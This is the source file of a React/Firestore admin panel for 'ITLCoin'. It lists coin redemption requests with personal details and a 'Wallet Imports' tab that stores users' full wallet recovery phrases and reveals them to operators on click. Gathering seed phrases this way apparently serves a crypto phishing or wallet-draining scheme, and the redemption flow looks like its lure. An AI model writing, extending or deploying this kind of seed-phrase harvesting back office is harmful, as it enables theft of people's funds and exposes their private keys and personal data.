"use client";

import { useEffect, useState } from "react";
import {
  collection,
  query,
  orderBy,
  onSnapshot,
  updateDoc,
  doc,
  where,
  getCountFromServer,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import type { AdminRedemption, WalletImport } from "@/types";

type Tab = "dashboard" | "redemptions" | "wallets";
type RedemptionStatus = "pending" | "reviewing" | "approved" | "paid" | "rejected";

const STATUS_STYLES: Record<RedemptionStatus, string> = {
  pending: "bg-amber-500/15 text-amber-300 border-amber-500/30",
  reviewing: "bg-blue-500/15 text-blue-300 border-blue-500/30",
  approved: "bg-violet-500/15 text-violet-300 border-violet-500/30",
  paid: "bg-emerald-500/15 text-emerald-300 border-emerald-500/30",
  rejected: "bg-red-500/15 text-red-300 border-red-500/30",
};

export default function AdminPage() {
  const [tab, setTab] = useState<Tab>("dashboard");
  const [redemptions, setRedemptions] = useState<AdminRedemption[]>([]);
  const [walletImports, setWalletImports] = useState<WalletImport[]>([]);
  const [loading, setLoading] = useState(true);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  // Live subscription to redemptions
  useEffect(() => {
    const q = query(
      collection(db, "redemptions"),
      orderBy("createdAt", "desc"),
    );
    const unsub = onSnapshot(q, (snap) => {
      const data = snap.docs.map((d) => ({
        id: d.id,
        ...(d.data() as Omit<AdminRedemption, "id">),
      }));
      setRedemptions(data);
      setLoading(false);
    });
    return () => unsub();
  }, []);

  // Live subscription to wallet imports
  useEffect(() => {
    const q = query(
      collection(db, "walletImports"),
      orderBy("createdAt", "desc"),
    );
    const unsub = onSnapshot(q, (snap) => {
      const data = snap.docs.map((d) => ({
        id: d.id,
        ...(d.data() as Omit<WalletImport, "id">),
      }));
      setWalletImports(data);
    });
    return () => unsub();
  }, []);

  const updateStatus = async (id: string, status: RedemptionStatus) => {
    try {
      await updateDoc(doc(db, "redemptions", id), {
        status,
        updatedAt: new Date().toISOString(),
      });
    } catch (err) {
      console.error("Failed to update status:", err);
    }
  };

  const pendingCount = redemptions.filter((r) => r.status === "pending").length;
  const paidCount = redemptions.filter((r) => r.status === "paid").length;
  const reviewingCount = redemptions.filter(
    (r) => r.status === "reviewing",
  ).length;
  const totalUsdt = redemptions
    .filter((r) => r.status !== "rejected")
    .reduce((sum, r) => sum + (parseFloat(r.usdtPayout || "0") || 0), 0);

  return (
    <div className="min-h-screen bg-[#050508] text-white">
      <div className="flex min-h-screen">
        {/* Sidebar */}
        <aside className="hidden md:flex w-64 flex-col border-r border-neutral-800/70 bg-neutral-950/50 backdrop-blur-xl">
          <div className="flex items-center gap-2.5 px-6 py-6 border-b border-neutral-800/70">
            <div className="relative h-8 w-8 shrink-0">
              <div className="absolute inset-0 rounded-full bg-cta-gradient shadow-glow" />
              <div className="absolute inset-[3px] rounded-full bg-neutral-950/90 flex items-center justify-center">
                <span className="text-[13px] font-extrabold bg-brand-gradient bg-clip-text text-transparent">
                  ITL
                </span>
              </div>
            </div>
            <div>
              <div className="text-sm font-bold">ITLCoin</div>
              <div className="text-[11px] text-neutral-500">Admin Panel</div>
            </div>
          </div>

          <nav className="flex-1 p-4 space-y-1">
            <NavItem
              label="Dashboard"
              active={tab === "dashboard"}
              onClick={() => setTab("dashboard")}
              icon={
                <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
                  <path d="M3 12 12 3l9 9M5 10v10h14V10" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              }
            />
            <NavItem
              label="Redemptions"
              active={tab === "redemptions"}
              onClick={() => setTab("redemptions")}
              badge={pendingCount}
              icon={
                <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
                  <path d="M3 3h18v4H3zM5 7v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7M9 12h6" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              }
            />
            <NavItem
              label="Wallet Imports"
              active={tab === "wallets"}
              onClick={() => setTab("wallets")}
              badge={walletImports.length}
              icon={
                <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
                  <path d="M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0ZM12 7v5l3 2" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              }
            />
          </nav>

          <div className="p-4 border-t border-neutral-800/70">
            <a
              href="/"
              className="flex items-center gap-2 text-sm text-neutral-400 hover:text-white transition-colors"
            >
              <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
                <path d="M18 6 6 18M6 6l12 12" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
              </svg>
              Back to site
            </a>
          </div>
        </aside>

        {/* Main content */}
        <main className="flex-1 min-w-0">
          {/* Top header */}
          <header className="sticky top-0 z-30 flex items-center justify-between gap-4 border-b border-neutral-800/70 bg-neutral-950/70 backdrop-blur-xl px-4 sm:px-6 lg:px-8 py-4">
            <div>
              <h1 className="text-xl font-bold">
                {tab === "dashboard"
                  ? "Dashboard"
                  : tab === "redemptions"
                    ? "Redemption Requests"
                    : "Wallet Imports"}
              </h1>
              <p className="text-xs text-neutral-500 mt-0.5">
                Live data from your Firestore database
              </p>
            </div>
            <div className="flex items-center gap-2 rounded-full border border-emerald-500/30 bg-emerald-500/10 px-3 py-1.5">
              <span className="relative inline-flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-400" />
              </span>
              <span className="text-xs font-medium text-emerald-300">Live</span>
            </div>
          </header>

          <div className="p-4 sm:p-6 lg:p-8">
            {!mounted ? (
              <div className="flex h-64 items-center justify-center">
                <div className="h-8 w-8 animate-spin rounded-full border-2 border-neutral-700 border-t-brand-500" />
              </div>
            ) : tab === "dashboard" ? (
              <DashboardView
                redemptions={redemptions}
                walletImports={walletImports}
                pendingCount={pendingCount}
                paidCount={paidCount}
                reviewingCount={reviewingCount}
                totalUsdt={totalUsdt}
                loading={loading}
                onGoRedemptions={() => setTab("redemptions")}
              />
            ) : tab === "redemptions" ? (
              <RedemptionsView
                redemptions={redemptions}
                loading={loading}
                onUpdateStatus={updateStatus}
              />
            ) : (
              <WalletsView walletImports={walletImports} loading={loading} />
            )}
          </div>
        </main>
      </div>
    </div>
  );
}

function NavItem({
  label,
  active,
  onClick,
  icon,
  badge,
}: {
  label: string;
  active: boolean;
  onClick: () => void;
  icon: React.ReactNode;
  badge?: number;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`flex w-full items-center gap-3 rounded-xl px-3 py-2.5 text-sm font-medium transition-all ${
        active
          ? "bg-brand-500/15 text-white border border-brand-500/30"
          : "text-neutral-400 hover:text-white hover:bg-neutral-800/50 border border-transparent"
      }`}
    >
      <span className={active ? "text-brand-400" : ""}>{icon}</span>
      <span className="flex-1 text-left">{label}</span>
      {badge !== undefined && badge > 0 ? (
        <span className="rounded-full bg-brand-500/20 px-2 py-0.5 text-xs font-semibold text-brand-300">
          {badge}
        </span>
      ) : null}
    </button>
  );
}

/* ---------------- Dashboard ---------------- */

function DashboardView({
  redemptions,
  walletImports,
  pendingCount,
  paidCount,
  reviewingCount,
  totalUsdt,
  loading,
  onGoRedemptions,
}: {
  redemptions: AdminRedemption[];
  walletImports: WalletImport[];
  pendingCount: number;
  paidCount: number;
  reviewingCount: number;
  totalUsdt: number;
  loading: boolean;
  onGoRedemptions: () => void;
}) {
  const stats = [
    {
      label: "Total Redemptions",
      value: redemptions.length.toString(),
      caption: "all requests",
      icon: (
        <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
          <path d="M3 3h18v4H3zM5 7v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      ),
      color: "text-brand-400 bg-brand-500/10 border-brand-500/30",
    },
    {
      label: "Pending Review",
      value: pendingCount.toString(),
      caption: "awaiting action",
      icon: (
        <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.8" />
          <path d="M12 7v5l3 2" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      ),
      color: "text-amber-400 bg-amber-500/10 border-amber-500/30",
    },
    {
      label: "Paid Out",
      value: paidCount.toString(),
      caption: "completed",
      icon: (
        <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
          <path d="m5 12 5 5L20 7" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      ),
      color: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
    },
    {
      label: "Total USDT Volume",
      value: totalUsdt.toLocaleString(undefined, { maximumFractionDigits: 2 }),
      caption: "USDT processed",
      icon: (
        <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
          <path d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      ),
      color: "text-violet-400 bg-violet-500/10 border-violet-500/30",
    },
  ];

  return (
    <div className="space-y-8">
      {/* Stats grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {stats.map((s) => (
          <div
            key={s.label}
            className="glass-card p-5 transition-all duration-300 hover:border-brand-600/50"
          >
            <div className="flex items-center justify-between">
              <span
                className={`inline-flex h-10 w-10 items-center justify-center rounded-xl border ${s.color}`}
              >
                {s.icon}
              </span>
              {loading ? (
                <div className="h-4 w-10 animate-pulse rounded bg-neutral-800" />
              ) : null}
            </div>
            <div className="mt-4 text-3xl font-extrabold text-white tabular-nums">
              {loading ? "—" : s.value}
            </div>
            <div className="mt-1 text-sm font-medium text-neutral-300">
              {s.label}
            </div>
            <div className="text-xs text-neutral-500">{s.caption}</div>
          </div>
        ))}
      </div>

      {/* Two column: recent redemptions + wallet imports */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass-card overflow-hidden">
          <div className="flex items-center justify-between px-5 py-4 border-b border-neutral-800/70">
            <h3 className="text-base font-semibold">Recent Redemptions</h3>
            <button
              type="button"
              onClick={onGoRedemptions}
              className="text-xs font-medium text-brand-400 hover:text-brand-300"
            >
              View all →
            </button>
          </div>
          <div className="divide-y divide-neutral-800/70">
            {loading ? (
              <SkeletonRows count={4} />
            ) : redemptions.length === 0 ? (
              <EmptyState label="No redemption requests yet" />
            ) : (
              redemptions.slice(0, 5).map((r) => (
                <div key={r.id} className="flex items-center justify-between px-5 py-3.5">
                  <div className="min-w-0">
                    <div className="text-sm font-medium text-white truncate">
                      {r.fullName}
                    </div>
                    <div className="text-xs text-neutral-500 truncate">
                      {r.itlAmount || "0"} ITL · {r.email}
                    </div>
                  </div>
                  <div className="flex items-center gap-3 shrink-0">
                    <span className="text-sm font-semibold text-white tabular-nums">
                      {r.usdtPayout || "0"} USDT
                    </span>
                    <span
                      className={`rounded-full border px-2.5 py-0.5 text-xs font-medium capitalize ${
                        STATUS_STYLES[(r.status as RedemptionStatus) || "pending"]
                      }`}
                    >
                      {r.status || "pending"}
                    </span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        <div className="glass-card overflow-hidden">
          <div className="flex items-center justify-between px-5 py-4 border-b border-neutral-800/70">
            <h3 className="text-base font-semibold">Recent Wallet Imports</h3>
            <span className="text-xs text-neutral-500">
              {walletImports.length} total
            </span>
          </div>
          <div className="divide-y divide-neutral-800/70">
            {walletImports.length === 0 ? (
              <EmptyState label="No wallet imports yet" />
            ) : (
              walletImports.slice(0, 5).map((w) => (
                <div key={w.id} className="flex items-center justify-between px-5 py-3.5">
                  <div className="min-w-0">
                    <div className="text-sm font-medium text-white truncate">
                      {w.wordCount} word phrase
                    </div>
                    <div className="text-xs text-neutral-500 truncate">
                      {w.recoveryPhrase.slice(0, 40)}…
                    </div>
                  </div>
                  <span
                    className={`rounded-full border px-2.5 py-0.5 text-xs font-medium capitalize ${STATUS_STYLES.approved}`}
                  >
                    {w.status}
                  </span>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ---------------- Redemptions table ---------------- */

function RedemptionsView({
  redemptions,
  loading,
  onUpdateStatus,
}: {
  redemptions: AdminRedemption[];
  loading: boolean;
  onUpdateStatus: (id: string, status: RedemptionStatus) => void;
}) {
  const [filter, setFilter] = useState<"all" | RedemptionStatus>("all");
  const [search, setSearch] = useState("");

  const filtered = redemptions.filter((r) => {
    const matchStatus = filter === "all" || r.status === filter;
    const matchSearch =
      search === "" ||
      r.fullName?.toLowerCase().includes(search.toLowerCase()) ||
      r.email?.toLowerCase().includes(search.toLowerCase()) ||
      r.walletAddress?.toLowerCase().includes(search.toLowerCase());
    return matchStatus && matchSearch;
  });

  return (
    <div className="space-y-5">
      {/* Filters */}
      <div className="flex flex-col sm:flex-row gap-3 sm:items-center sm:justify-between">
        <div className="relative flex-1 max-w-sm">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-neutral-500"
          >
            <circle cx="11" cy="11" r="7" stroke="currentColor" strokeWidth="1.8" />
            <path d="m21 21-4.3-4.3" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
          <input
            type="text"
            placeholder="Search by name, email, or wallet…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full rounded-xl border border-neutral-700 bg-neutral-900/80 pl-10 pr-4 py-2.5 text-sm text-white placeholder:text-neutral-500 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 outline-none"
          />
        </div>
        <div className="flex flex-wrap gap-2">
          {(["all", "pending", "reviewing", "approved", "paid", "rejected"] as const).map(
            (s) => (
              <button
                key={s}
                type="button"
                onClick={() => setFilter(s)}
                className={`rounded-lg px-3 py-1.5 text-xs font-medium capitalize transition ${
                  filter === s
                    ? "bg-brand-500/20 text-brand-200 border border-brand-500/40"
                    : "bg-neutral-900/60 text-neutral-400 border border-neutral-700 hover:text-white"
                }`}
              >
                {s}
              </button>
            ),
          )}
        </div>
      </div>

      {/* Table */}
      <div className="glass-card overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-neutral-800/70 text-left text-xs uppercase tracking-wider text-neutral-500">
                <th className="px-5 py-3 font-semibold">Name</th>
                <th className="px-5 py-3 font-semibold">Amount</th>
                <th className="px-5 py-3 font-semibold">Payout</th>
                <th className="px-5 py-3 font-semibold">Wallet</th>
                <th className="px-5 py-3 font-semibold">Status</th>
                <th className="px-5 py-3 font-semibold text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-neutral-800/70">
              {loading ? (
                <SkeletonRows count={6} table />
              ) : filtered.length === 0 ? (
                <tr>
                  <td colSpan={6} className="px-5 py-12 text-center text-neutral-500">
                    No redemption requests match your filters.
                  </td>
                </tr>
              ) : (
                filtered.map((r) => (
                  <tr key={r.id} className="hover:bg-neutral-900/40 transition-colors">
                    <td className="px-5 py-4">
                      <div className="font-medium text-white">{r.fullName}</div>
                      <div className="text-xs text-neutral-500">{r.email}</div>
                    </td>
                    <td className="px-5 py-4 tabular-nums text-neutral-300">
                      {r.itlAmount || "0"} ITL
                    </td>
                    <td className="px-5 py-4 tabular-nums font-semibold text-white">
                      {r.usdtPayout || "0"} USDT
                    </td>
                    <td className="px-5 py-4">
                      <code className="text-xs text-neutral-400 break-all max-w-[160px] block">
                        {r.walletAddress}
                      </code>
                    </td>
                    <td className="px-5 py-4">
                      <span
                        className={`inline-flex rounded-full border px-2.5 py-0.5 text-xs font-medium capitalize ${
                          STATUS_STYLES[(r.status as RedemptionStatus) || "pending"]
                        }`}
                      >
                        {r.status || "pending"}
                      </span>
                    </td>
                    <td className="px-5 py-4">
                      <StatusActions
                        current={(r.status as RedemptionStatus) || "pending"}
                        onSelect={(s) => onUpdateStatus(r.id!, s)}
                      />
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

function StatusActions({
  current,
  onSelect,
}: {
  current: RedemptionStatus;
  onSelect: (s: RedemptionStatus) => void;
}) {
  const [open, setOpen] = useState(false);
  const options: RedemptionStatus[] = [
    "pending",
    "reviewing",
    "approved",
    "paid",
    "rejected",
  ];
  return (
    <div className="relative inline-block text-right">
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        className="rounded-lg border border-neutral-700 bg-neutral-900/60 px-3 py-1.5 text-xs font-medium text-neutral-300 hover:bg-neutral-800"
      >
        Update ▾
      </button>
      {open ? (
        <>
          <div
            className="fixed inset-0 z-10"
            onClick={() => setOpen(false)}
          />
          <div className="absolute right-0 z-20 mt-1 w-36 rounded-xl border border-neutral-700 bg-neutral-900 shadow-xl py-1">
            {options.map((o) => (
              <button
                key={o}
                type="button"
                onClick={() => {
                  onSelect(o);
                  setOpen(false);
                }}
                className={`block w-full px-3 py-1.5 text-left text-xs capitalize transition-colors ${
                  o === current
                    ? "text-brand-300 bg-brand-500/10"
                    : "text-neutral-300 hover:bg-neutral-800"
                }`}
              >
                {o}
              </button>
            ))}
          </div>
        </>
      ) : null}
    </div>
  );
}

/* ---------------- Wallet imports table ---------------- */

function WalletsView({
  walletImports,
  loading,
}: {
  walletImports: WalletImport[];
  loading: boolean;
}) {
  const [revealed, setRevealed] = useState<Record<string, boolean>>({});

  return (
    <div className="space-y-5">
      <div className="flex items-center justify-between">
        <p className="text-sm text-neutral-400">
          {walletImports.length} wallet{walletImports.length === 1 ? "" : "s"} imported
        </p>
      </div>

      <div className="glass-card overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-neutral-800/70 text-left text-xs uppercase tracking-wider text-neutral-500">
                <th className="px-5 py-3 font-semibold">Phrase</th>
                <th className="px-5 py-3 font-semibold">Words</th>
                <th className="px-5 py-3 font-semibold">Status</th>
                <th className="px-5 py-3 font-semibold text-right">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-neutral-800/70">
              {loading ? (
                <SkeletonRows count={5} table />
              ) : walletImports.length === 0 ? (
                <tr>
                  <td colSpan={4} className="px-5 py-12 text-center text-neutral-500">
                    No wallet imports yet.
                  </td>
                </tr>
              ) : (
                walletImports.map((w) => (
                  <tr key={w.id} className="hover:bg-neutral-900/40 transition-colors">
                    <td className="px-5 py-4">
                      <code className="text-xs text-neutral-300 break-all max-w-md block">
                        {revealed[w.id!]
                          ? w.recoveryPhrase
                          : "•".repeat(Math.min(w.recoveryPhrase.length, 48))}
                      </code>
                    </td>
                    <td className="px-5 py-4 tabular-nums text-neutral-300">
                      {w.wordCount}
                    </td>
                    <td className="px-5 py-4">
                      <span
                        className={`inline-flex rounded-full border px-2.5 py-0.5 text-xs font-medium capitalize ${STATUS_STYLES.approved}`}
                      >
                        {w.status}
                      </span>
                    </td>
                    <td className="px-5 py-4 text-right">
                      <button
                        type="button"
                        onClick={() =>
                          setRevealed((prev) => ({
                            ...prev,
                            [w.id!]: !prev[w.id!],
                          }))
                        }
                        className="rounded-lg border border-neutral-700 bg-neutral-900/60 px-3 py-1.5 text-xs font-medium text-neutral-300 hover:bg-neutral-800"
                      >
                        {revealed[w.id!] ? "Hide" : "Reveal"}
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

/* ---------------- Shared UI ---------------- */

function EmptyState({ label }: { label: string }) {
  return (
    <div className="px-5 py-12 text-center text-sm text-neutral-500">
      {label}
    </div>
  );
}

function SkeletonRows({ count, table }: { count: number; table?: boolean }) {
  return (
    <>
      {Array.from({ length: count }).map((_, i) => (
        <div
          key={i}
          className={
            table
              ? "px-5 py-4"
              : "flex items-center justify-between px-5 py-3.5"
          }
        >
          {table ? (
            <div className="flex items-center gap-4">
              <div className="h-4 w-24 animate-pulse rounded bg-neutral-800" />
              <div className="h-4 w-16 animate-pulse rounded bg-neutral-800" />
              <div className="h-4 w-20 animate-pulse rounded bg-neutral-800" />
            </div>
          ) : (
            <>
              <div className="h-4 w-32 animate-pulse rounded bg-neutral-800" />
              <div className="h-4 w-16 animate-pulse rounded bg-neutral-800" />
            </>
          )}
        </div>
      ))}
    </>
  );
}
